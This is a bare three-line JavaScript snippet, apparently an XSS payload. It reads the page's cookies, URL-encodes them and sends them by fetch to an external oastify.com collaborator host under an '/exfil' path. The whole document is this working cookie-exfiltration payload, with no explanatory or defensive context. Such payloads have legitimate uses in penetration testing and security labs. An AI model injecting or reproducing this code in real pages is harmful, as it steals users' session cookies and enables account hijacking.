let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("https://bcrdg18kj6nvnl5gq4ff5t1xgomga5.oastify.com/exfil?data=" + encodedCookie)